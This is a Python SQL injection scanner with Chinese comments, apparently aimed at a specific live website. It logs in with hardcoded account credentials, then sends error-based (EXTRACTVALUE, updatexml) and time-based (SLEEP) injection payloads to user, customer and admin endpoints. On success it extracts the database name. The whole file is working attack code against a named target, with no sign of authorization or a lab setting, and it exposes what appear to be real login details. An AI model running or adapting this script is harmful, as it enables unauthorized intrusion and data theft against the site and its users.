#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
import urllib3
urllib3.disable_warnings()

class QuickDeepScan:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.login()
        self.found = []
        
    def login(self):
        login_data = {'MobileNumber': '0902955198', 'Password': 'Hieutruong@0115'}
        r = self.session.post(f"{self.base_url}/Account/JLogin", data=login_data, timeout=10)
        if r.status_code == 200:
            print("[+] 登录成功")
    
    def test_endpoint(self, endpoint, param, payload, method='GET'):
        """测试端点"""
        try:
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
            elif method == 'POST':
                data = {param: payload}
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=15)
                elapsed = 0
            else:
                return None
            
            has_test = 'TEST' in r.text
            has_xpath = 'XPATH' in r.text.upper()
            has_delay = elapsed > 4
            
            if has_test or has_xpath or has_delay:
                result = {
                    'endpoint': endpoint,
                    'param': param,
                    'method': method,
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_delay': has_delay,
                    'elapsed': elapsed,
                    'response': r.text[:500]
                }
                
                if has_xpath:
                    match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                    if match:
                        result['extracted'] = match.group(1)
                        print(f"\n[✓] 找到SQL注入: {endpoint} [{param}]")
                        print(f"    提取: {match.group(1)}")
                        return result
                
                return result
        except:
            pass
        return None
    
    def run_quick_scan(self):
        """快速扫描关键端点"""
        print("="*60)
        print("快速深度扫描")
        print("="*60)
        
        # 关键端点
        endpoints = [
            '/Account/GetUserInfo',
            '/Account/GetUser',
            '/Account/GetUserById',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/GetCustomer',
            '/Handle/GetWareHouse',
            '/api/user',
            '/api/users',
            '/Admin/GetUser',
        ]
        
        params = ['id', 'ID', 'userId', 'user_id', 'customer_id', 'q', 'search']
        payloads = [
            ("1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--", 'EXTRACTVALUE'),
            ("1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--", 'updatexml'),
            ("1' AND SLEEP(5)--", 'SLEEP'),
        ]
        
        for endpoint in endpoints:
            for param in params:
                for payload, ptype in payloads:
                    for method in ['GET', 'POST']:
                        result = self.test_endpoint(endpoint, param, payload, method)
                        if result and result.get('extracted'):
                            self.found.append(result)
                            # 提取数据库
                            db_payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--"
                            db_result = self.test_endpoint(endpoint, param, db_payload, method)
                            if db_result and db_result.get('extracted'):
                                print(f"    [+] 数据库名: {db_result['extracted']}")
                                return endpoint, param, method, db_result['extracted']
        
        print(f"\n[*] 发现 {len(self.found)} 个可疑点")
        return None

if __name__ == "__main__":
    scanner = QuickDeepScan()
    scanner.run_quick_scan()